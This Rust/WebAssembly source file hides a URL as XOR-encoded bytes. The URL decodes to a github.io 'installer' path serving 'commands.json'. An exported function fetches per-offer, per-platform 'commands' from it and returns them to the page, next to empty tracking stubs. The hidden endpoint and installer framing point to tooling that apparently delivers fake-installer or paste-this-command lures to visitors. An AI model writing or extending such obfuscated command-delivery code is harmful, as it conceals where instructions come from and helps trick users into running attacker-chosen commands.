use wasm_bindgen::prelude::*;
use wasm_bindgen_futures::JsFuture;
use web_sys::{Request, RequestInit, RequestMode, Response};


const ENCRYPTED_URL: &[u8] = &[
    0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75,  
    0x2c, 0x3f, 0x28, 0x39, 0x2a, 0x3b, 0x28, 0x31,  
    0x3f, 0x28, 0x63, 0x6a, 0x74, 0x3d, 0x33, 0x2e,  
    0x32, 0x2f, 0x38, 0x74, 0x33, 0x35, 0x75, 0x33,  
    0x34, 0x29, 0x2e, 0x3b, 0x36, 0x36, 0x3f, 0x28,  
    0x77, 0x6a, 0x6a, 0x68, 0x69, 0x68, 0x6e, 0x63,  
    0x75, 0x39, 0x35, 0x37, 0x37, 0x3b, 0x34, 0x3e,  
    0x29, 0x74, 0x30, 0x29, 0x35, 0x34,              
];
const XOR_KEY: u8 = 0x5A;

fn get_url() -> String {
    ENCRYPTED_URL
        .iter()
        .map(|b| (b ^ XOR_KEY) as char)
        .collect()
}

#[wasm_bindgen]
pub async fn get_commands(offer: &str, platform: &str) -> JsValue {
    let url = format!("{}?offer={}&platform={}", get_url(), offer, platform);

    let opts = RequestInit::new();
    opts.set_method("GET");
    opts.set_mode(RequestMode::Cors);

    let request = match Request::new_with_str_and_init(&url, &opts) {
        Ok(r) => r,
        Err(_) => return JsValue::NULL,
    };

    let window = match web_sys::window() {
        Some(w) => w,
        None => return JsValue::NULL,
    };

    let resp_value = match JsFuture::from(window.fetch_with_request(&request)).await {
        Ok(v) => v,
        Err(_) => return JsValue::NULL,
    };

    let resp: Response = match resp_value.dyn_into() {
        Ok(r) => r,
        Err(_) => return JsValue::NULL,
    };

    if !resp.ok() {
        return JsValue::NULL;
    }

    // Читаем текст и парсим вручную через js_sys
    let text = match JsFuture::from(resp.text().unwrap()).await {
        Ok(t) => t,
        Err(_) => return JsValue::NULL,
    };

    // Парсим JSON через JS
    let json = js_sys::JSON::parse(&text.as_string().unwrap_or_default());
    match json {
        Ok(v) => v,
        Err(_) => JsValue::NULL,
    }
}

#[wasm_bindgen]
pub fn track_pageview(_offer: &str) {}

#[wasm_bindgen]
pub fn track_event(_offer: &str, _event_type: &str, _detail: &str) {}
